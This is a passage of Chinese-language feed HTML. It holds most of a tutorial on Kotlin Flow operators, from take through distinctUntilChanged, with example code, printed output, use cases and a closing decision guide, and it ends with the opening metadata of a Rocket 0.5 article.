<span class="hljs-comment">// 4</span>
</code></pre>
<p>适用场景：根据条件丢弃不需要的值，例如过滤空搜索词或无效数据。</p>
<h3 data-id="heading-3">take</h3>
<p>限制性操作符，仅发出 <code>Flow</code> 的前 <code>n</code> 个元素，随后取消 <code>Flow</code> 执行。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.10</span>).asFlow()
        .take(<span class="hljs-number">3</span>)
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 3</span>
</code></pre>
<p>适用场景：只需要有限数量的项，例如分页加载，或从一系列操作中取第一个有效结果。</p>
<hr/>
<h2 data-id="heading-4">累积值</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed8dfb6e502c43d9b4b7551be1fc8011~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=1COawG3a%2BdsCCD5sHH3RERsW0XU%3D" alt="3.png" loading="lazy"/></p>
<h3 data-id="heading-5">reduce</h3>
<p>终端操作符，从 <code>Flow</code> 的第一个元素开始累积值，并对当前累加器与每个元素执行操作。若 <code>Flow</code> 为空则抛出异常。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> sum = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow().reduce { accumulator, value -&gt; accumulator + value }
    println(sum)
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 6</span>
</code></pre>
<h3 data-id="heading-6">fold</h3>
<p>类似于 <code>reduce</code>，但 <code>fold</code> 需要一个初始值，是更安全的选择。</p>
<p>即使 <code>Flow</code> 为空也会返回初始值。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> sum = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow().fold(<span class="hljs-number">100</span>) { accumulator, value -&gt; accumulator + value }
    println(sum)
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 106</span>
</code></pre>
<h3 data-id="heading-7">runningReduce / scan</h3>
<p>中间操作符，在每个元素处理时都发出当前累积值。</p>
<p><em>中间操作符不会触发 <code>Flow</code> 的收集，所以需要 <code>collect</code> 触发 <code>Flow</code> 的收集，而 <code>reduce</code> 这种终端操作符会触发 <code>Flow</code> 的收集。</em></p>
<p><code>scan</code> 是更通用的版本，支持指定初始种子值。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"runningReduce:"</span>)
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .runningReduce { accumulator, value -&gt; accumulator + value }
        .collect { println(it) } 

    println(<span class="hljs-string">"scan:"</span>)
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .scan(<span class="hljs-number">0</span>) { accumulator, value -&gt; accumulator + value }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// runningReduce:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// 6</span>
<span class="hljs-comment">// scan:</span>
<span class="hljs-comment">// 0</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// 6</span>
</code></pre>
<p>注意：他们会返回每一步的结果，而 <code>reduce</code>/<code>fold</code> 只返回最终结果。</p>
<p>适用场景：计算累计总和、跟踪进度，或在状态机中展示状态历史。</p>
<hr/>
<h2 data-id="heading-8">发出多个值</h2>
<h3 data-id="heading-9">transform</h3>
<p>高度灵活的操作符，可为每个输入元素发出零个、一个或多个值，对输出流有更强控制力。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.2</span>).asFlow()
        .transform {
            emit(<span class="hljs-string">"Item: <span class="hljs-variable">$it</span>"</span>)
            <span class="hljs-keyword">if</span> (it % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) {
                emit(<span class="hljs-string">"...is an odd number"</span>)
            }
            emit(<span class="hljs-string">"Square: <span class="hljs-subst">${it * it}</span>"</span>)
        }.collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Item: 1</span>
<span class="hljs-comment">// ...is an odd number</span>
<span class="hljs-comment">// Square: 1</span>
<span class="hljs-comment">// Item: 2</span>
<span class="hljs-comment">// Square: 4</span>
</code></pre>
<p>适用场景：执行复杂转换、引入副作用（如日志记录），或根据单个输入有条件地发出多个值。</p>
<hr/>
<h2 data-id="heading-10">扁平化嵌套</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b154009cd2e4d66b4c5014e5ae8641e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=MxLI8kVIGB3BJ5Zg4Ln7RIwwYns%3D" alt="4.png" loading="lazy"/></p>
<h3 data-id="heading-11">flatMapConcat</h3>
<p>将每个元素转换为一个 <code>Flow</code>，然后依次连接这些 <code>Flow</code>，只有当前一个 <code>Flow</code> 完成后，下一个才开始。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNumbersFlow</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: Flow&lt;String&gt; = flow {
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"First-<span class="hljs-variable">$id</span>"</span>)
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"Second-<span class="hljs-variable">$id</span>"</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.2</span>).asFlow().flatMapConcat { id -&gt; getNumbersFlow(id) }.collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// First-1</span>
<span class="hljs-comment">// Second-1</span>
<span class="hljs-comment">// First-2</span>
<span class="hljs-comment">// Second-2</span>
</code></pre>
<p><em>仔细看，第一个流的每个数字都会参与到第二个流中。</em></p>
<p>适用场景：顺序敏感的操作，例如依次上传多个文件，或执行依赖型网络请求。</p>
<h3 data-id="heading-12">flatMapMerge</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4254fe85b6c142c687e6a790fa6c97a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=o%2FW51%2FAQwiZtZ0aXVrUeQpyxh94%3D" alt="1.png" loading="lazy"/></p>
<p>并发合并由转换函数生成的多个 <code>Flow</code>，可通过 <code>concurrency</code> 参数控制并发数量。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNumbersFlow</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: Flow&lt;String&gt; = flow {
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"First-<span class="hljs-variable">$id</span>"</span>)
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"Second-<span class="hljs-variable">$id</span>"</span>)
}

<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.2</span>).asFlow()
        .flatMapMerge { id -&gt; getNumbersFlow(id) }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// First-1</span>
<span class="hljs-comment">// First-2</span>
<span class="hljs-comment">// Second-2</span>
<span class="hljs-comment">// Second-1</span>
</code></pre>
<p>从结果上注意区分 <code>flatMapConcat</code>，<code>flatMapMerge</code> 不会保证合并的顺序。</p>
<p>适用场景：顺序无关的并行操作，例如同时从多个数据源获取数据。</p>
<h3 data-id="heading-13">flatMapLatest</h3>
<p>当新元素发出时，立即取消上一个元素对应的 <code>Flow</code>。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">val</span> searchQuery = flowOf(<span class="hljs-string">"search"</span>, <span class="hljs-string">"search with new term"</span>).onEach { delay(<span class="hljs-number">200</span>) }

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">searchApi</span><span class="hljs-params">(query: <span class="hljs-type">String</span>)</span></span>: Flow&lt;String&gt; = flow {
    emit(<span class="hljs-string">"Searching for '<span class="hljs-variable">$query</span>'..."</span>)
    delay(<span class="hljs-number">500</span>) <span class="hljs-comment">// 模拟网络延迟</span>
    emit(<span class="hljs-string">"Results for '<span class="hljs-variable">$query</span>'"</span>)
}

<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    searchQuery
        .flatMapLatest { query -&gt; searchApi(query) }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Searching for 'search'...</span>
<span class="hljs-comment">// Searching for 'search with new term'...</span>
<span class="hljs-comment">// Results for 'search with new term'</span>
</code></pre>
<p>适用场景：实时搜索功能，或任何只需关注最新事件结果的场景。</p>
<hr/>
<h2 data-id="heading-14">上下文与缓冲</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce7e6dce687947efa5a9c0ff702537f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=Una%2BLIFuOR1cwRS6q6ZRLj2aj28%3D" alt="5.png" loading="lazy"/></p>
<h3 data-id="heading-15">flowOn</h3>
<p>更改用于执行上游 <code>Flow</code> 的 <code>CoroutineContext</code>，是 <code>Flow</code> 中切换调度器的正确方式。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">heavyWork</span><span class="hljs-params">()</span></span>: Flow&lt;<span class="hljs-built_in">Int</span>&gt; = flow {
    println(<span class="hljs-string">"Starting heavy work on <span class="hljs-subst">${Thread.currentThread().name}</span>"</span>)
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
        <span class="hljs-comment">// Simulate CPU-intensive work</span>
        Thread.sleep(<span class="hljs-number">100</span>)
        emit(i)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    heavyWork()
        .flowOn(Dispatchers.IO) <span class="hljs-comment">// Upstream runs on IO dispatcher</span>
        .collect {
            println(<span class="hljs-string">"Collected <span class="hljs-variable">$it</span> on <span class="hljs-subst">${Thread.currentThread().name}</span>"</span>)
        }
    <span class="hljs-comment">// Downstream runs on the collector's context (e.g., Main)</span>
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Starting heavy work on DefaultDispatcher-worker-1</span>
<span class="hljs-comment">// Collected 1 on main</span>
<span class="hljs-comment">// Collected 2 on main</span>
<span class="hljs-comment">// Collected 3 on main</span>
</code></pre>
<h3 data-id="heading-16">buffer</h3>
<p>通过解耦生产者与消费者实现并发执行：生产者将项放入缓冲区，消费者从中取出。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> time = measureTimeMillis {
        flow {
            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
                delay(<span class="hljs-number">200</span>) <span class="hljs-comment">// Simulate slow emission</span>
                emit(i)
            }
        }
        .buffer() <span class="hljs-comment">// With buffer, the total time is closer to the slow collector's time</span>
        .collect {
            delay(<span class="hljs-number">300</span>) <span class="hljs-comment">// Simulate slow collection</span>
            println(it)
        }
    }
    println(<span class="hljs-string">"Collected in <span class="hljs-variable">$time</span> ms"</span>)
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// Collected in 1172 ms</span>
</code></pre>
<p>得益于 <code>buffer</code>，最后整个数据的收集时间要小于 <code>(200 + 300) * 3</code>。</p>
<p>使用场景：当生产者与消费者处理速度不一致时，提升性能。</p>
<h3 data-id="heading-17">conflate</h3>
<p>一种缓冲形式，当收集器处理太慢时会丢弃中间值，确保始终获取最新值。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.5</span>) {
            delay(<span class="hljs-number">100</span>)
            emit(i)
        }
    }
    .conflate()
    .collect { value -&gt;
        println(<span class="hljs-string">"Started processing <span class="hljs-variable">$value</span>"</span>)
        delay(<span class="hljs-number">300</span>)
        println(<span class="hljs-string">"Finished processing <span class="hljs-variable">$value</span>"</span>)
    }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Started processing 1</span>
<span class="hljs-comment">// Finished processing 1</span>
<span class="hljs-comment">// Started processing 3</span>
<span class="hljs-comment">// Finished processing 3</span>
<span class="hljs-comment">// Started processing 5</span>
<span class="hljs-comment">// Finished processing 5</span>
</code></pre>
<p>适用场景：UI 更新中无需显示中间状态，如股票行情或 GPS 位置更新。</p>
<h3 data-id="heading-18">collectLatest</h3>
<p>终端操作符，当新值发出时，取消对前一个值的收集逻辑。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .onEach { delay(<span class="hljs-number">100</span>) }
        .collectLatest { value -&gt;
            println(<span class="hljs-string">"Collecting <span class="hljs-variable">$value</span>"</span>)
            delay(<span class="hljs-number">300</span>)
            println(<span class="hljs-string">"Finished collecting <span class="hljs-variable">$value</span>"</span>)
        }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Collecting 1</span>
<span class="hljs-comment">// Collecting 2</span>
<span class="hljs-comment">// Collecting 3</span>
<span class="hljs-comment">// Finished collecting 3</span>
</code></pre>
<p><em>注意看这里的结果，Finished collecting 只收集了最后一次的值，一定要注意这个特性。</em></p>
<p>适用场景：某项操作耗时较长，且应在新项到达时被取消，例如将用户输入保存到数据库。</p>
<hr/>
<h2 data-id="heading-19">合并</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/debdb8739b2a4d94b5ac4348155e0fb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=7%2B6T%2FLUhSUM1fiRI0Bihj%2Bxro4c%3D" alt="6.png" loading="lazy"/></p>
<h3 data-id="heading-20">zip</h3>
<p>等待两个 <code>Flow</code> 各自发出一项后进行组合。任一源 <code>Flow</code> 结束，结果 <code>Flow</code> 即结束。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> flowA = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
    <span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>)

    flowA.zip(flowB) { number, letter -&gt; <span class="hljs-string">"<span class="hljs-variable">$number</span><span class="hljs-variable">$letter</span>"</span> }
        .collect { println(it) } 
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1A</span>
<span class="hljs-comment">// 2B</span>
<span class="hljs-comment">// 3C</span>
</code></pre>
<h3 data-id="heading-21">combine</h3>
<p>组合两个 <code>Flow</code> 的最新值。只要任一源 <code>Flow</code> 发出新值（且双方至少各发出过一次），就会触发一次发射。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> flowA = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow().onEach { delay(<span class="hljs-number">100</span>) }
    <span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>).onEach { delay(<span class="hljs-number">150</span>) }

    flowA.combine(flowB) { number, letter -&gt; <span class="hljs-string">"<span class="hljs-variable">$number</span><span class="hljs-variable">$letter</span>"</span> }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1A</span>
<span class="hljs-comment">// 2A</span>
<span class="hljs-comment">// 3A</span>
<span class="hljs-comment">// 3B</span>
</code></pre>
<p>适用场景：响应多个数据源的变化。</p>
<h3 data-id="heading-22">merge</h3>
<p>将多个 <code>Flow</code> 合并为一个，按发出顺序交错输出所有值。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> flowA = flowOf(<span class="hljs-string">"A1"</span>, <span class="hljs-string">"A2"</span>).onEach { delay(<span class="hljs-number">100</span>) }
    <span class="hljs-keyword">val</span> flowB = flowOf(<span class="hljs-string">"B1"</span>, <span class="hljs-string">"B2"</span>).onEach { delay(<span class="hljs-number">50</span>) }

    merge(flowA, flowB)
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// B1</span>
<span class="hljs-comment">// A1</span>
<span class="hljs-comment">// B2</span>
<span class="hljs-comment">// A2</span>
</code></pre>
<p>适用场景：将来自不同 UI 组件的多个事件流合并为单一处理流。</p>
<hr/>
<h2 data-id="heading-23">错误与完成处理</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95682e5dd75b4e80af39a6f3fb05b9cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=xwKucKREDlNVuyFwOpiP%2B7lj1lc%3D" alt="7.png" loading="lazy"/></p>
<h3 data-id="heading-24">catch</h3>
<p>捕获上游 <code>Flow</code>（即 <code>catch</code> 之前的操作符）中发生的异常，但不捕获下游收集器中的异常。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        emit(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Error!"</span>)
    }
    .<span class="hljs-keyword">catch</span> { e -&gt;
        println(<span class="hljs-string">"Caught: <span class="hljs-subst">${e.message}</span>"</span>)
        emit(-<span class="hljs-number">1</span>) <span class="hljs-comment">// Emit a fallback value</span>
    }
    .collect { println(it) } <span class="hljs-comment">// Emits 1, then -1</span>
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// Caught: Error!</span>
<span class="hljs-comment">// -1</span>
</code></pre>
<p>适用场景：优雅地处理错误、提供默认值或记录失败信息。</p>
<h3 data-id="heading-25">onCompletion</h3>
<p>在 <code>Flow</code> 完成时（无论成功或异常）执行指定操作。成功时 <code>cause</code> 为 <code>null</code>。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .onCompletion { cause -&gt;
            <span class="hljs-keyword">if</span> (cause != <span class="hljs-literal">null</span>) println(<span class="hljs-string">"Flow completed with error"</span>)
            <span class="hljs-keyword">else</span> println(<span class="hljs-string">"Flow completed successfully"</span>)
        }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// Flow completed successfully</span>
</code></pre>
<h3 data-id="heading-26">retryWhen</h3>
<p>在发生异常时根据谓词（包含异常原因和重试次数）决定是否重试。</p>
<pre><code class="hljs language-scss" lang="scss">suspend fun <span class="hljs-selector-tag">main</span>() {
    <span class="hljs-selector-tag">var</span> attemptCount = <span class="hljs-number">0</span>
    <span class="hljs-attribute">flow</span> {
        <span class="hljs-built_in">emit</span>(<span class="hljs-number">1</span>)
        if (attemptCount &lt; <span class="hljs-number">2</span>) {
            attemptCount++
            throw <span class="hljs-built_in">RuntimeException</span>("Transient error")
        }
        <span class="hljs-built_in">emit</span>(<span class="hljs-number">2</span>)
    }
    <span class="hljs-selector-class">.retryWhen</span> { cause, attempt -&gt;
        <span class="hljs-built_in">println</span>("Attempt $attempt: Retrying due to ${cause.message}")
        <span class="hljs-built_in">delay</span>(<span class="hljs-number">100</span>) <span class="hljs-comment">// Add a delay before retrying</span>
        attempt &lt; <span class="hljs-number">2</span> <span class="hljs-comment">// Retry up to 2 times</span>
    }
    <span class="hljs-selector-class">.catch</span> { <span class="hljs-built_in">println</span>("Caught final error: ${it.message}") }
    <span class="hljs-selector-class">.collect</span> { <span class="hljs-built_in">println</span>(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// Attempt 0: Retrying due to Transient error</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// Attempt 1: Retrying due to Transient error</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
</code></pre>
<p><code>retryWhen</code> 的回调有两个参数：</p>
<ul>
<li><code>cause</code>：导致 <code>Flow</code> 失败的异常（<code>Throwable</code> 类型）。</li>
<li><code>attempt</code>：当前是第几次重试，从 <code>0</code> 开始计数。</li>
</ul>
<hr/>
<h2 data-id="heading-27">工具与副作用</h2>
<h3 data-id="heading-28">onEach</h3>
<p>对 <code>Flow</code> 中每个元素执行指定操作，但不修改元素本身。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .onEach { println(<span class="hljs-string">"About to process <span class="hljs-variable">$it</span>"</span>) }
        .map { it * it }
        .collect { println(<span class="hljs-string">"Processed value: <span class="hljs-variable">$it</span>"</span>) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// About to process 1</span>
<span class="hljs-comment">// Processed value: 1</span>
<span class="hljs-comment">// About to process 2</span>
<span class="hljs-comment">// Processed value: 4</span>
<span class="hljs-comment">// About to process 3</span>
<span class="hljs-comment">// Processed value: 9</span>
</code></pre>
<p>适用场景：用于日志、调试或埋点等副作用场景，在不改变数据的前提下观察 <code>Flow</code>。</p>
<h3 data-id="heading-29">debounce</h3>
<p>过滤在指定超时内被新值取代的值，仅发出“突发”中的最后一个值。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        emit(<span class="hljs-number">1</span>)
        delay(<span class="hljs-number">90</span>)
        emit(<span class="hljs-number">2</span>)
        delay(<span class="hljs-number">90</span>)
        emit(<span class="hljs-number">3</span>)
        delay(<span class="hljs-number">500</span>)
        emit(<span class="hljs-number">4</span>)
        delay(<span class="hljs-number">90</span>)
        emit(<span class="hljs-number">5</span>)
    }.debounce(<span class="hljs-number">100</span>).collect { println(it) } 
}
<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// 5</span>
</code></pre>
<p>适用场景：处理快速用户输入（如搜索框），避免每次按键都触发 API 请求。</p>
<h3 data-id="heading-30">distinctUntilChanged</h3>
<p>抑制与前一个值相同的重复发射。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>)
        .distinctUntilChanged()
        .collect { println(it) } 
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 3</span>
</code></pre>
<p>适用场景：防止 UI 因状态未变而进行不必要的重组或更新。</p>
<hr/>
<h2 data-id="heading-31">核心决策指南</h2>
<ul>
<li>数据转换。用于修改流中的值：<code>map</code>，<code>filter</code>，<code>distinctUntilChanged</code>。</li>
<li>累积值。用于跟踪状态或计算持续结果：<code>scan</code>，<code>runningReduce</code>，<code>fold</code>，<code>reduce</code>。</li>
<li>从单一输入发出多个值。用于自定义发射逻辑：<code>transform</code>。</li>
<li>处理嵌套或动态 <code>Flow</code>。根据内部 <code>Flow</code> 行为选择：<code>flatMapConcat</code>（顺序执行）、<code>flatMapMerge</code>（并发执行）、<code>flatMapLatest</code>（取消旧任务，保留最新）。</li>
<li>性能与背压控制。用于优化收集效率与响应性：<code>buffer</code>，<code>conflate</code>，<code>collectLatest</code>，<code>flowOn</code>。</li>
<li>合并多个流。用于组合多个数据源：<code>zip</code>（按顺序配对）、<code>combine</code>（组合最新值）、<code>merge</code>（交错合并）。</li>
<li>错误处理与完成逻辑。用于应对异常和生命周期事件：<code>catch</code>，<code>onCompletion</code>，<code>retryWhen</code>。</li>
<li>调试与副作用。用于插入日志或副作用操作：<code>onEach</code>。</li>
<li>处理高频发射。用于抑制过快的发射频率：<code>debounce</code>。</li>
<li>触发 <code>Flow</code> 执行。终端操作符：<code>collect</code>，<code>collectLatest</code>，<code>first</code>，<code>single</code>，<code>toList</code>，<code>reduce</code>，<code>fold</code>。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Rocket 0.5 快速上手从克隆仓库到跑起第一个示例]]></title>    <link>https://juejin.cn/post/7581765536372391945</link>    <guid>https://juejin.cn/post/7581765536372391945</guid>    <pubDate>2025-12-10T02:42:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581765536372391945" data-draft-id="7581727073582006323" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Rocket 0.5 快速上手从克隆仓库到跑起第一个示例"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-10T02:42:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HelloReader"/> <meta itemprop="url" content="https://juejin.cn/user/2601910535729322"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" 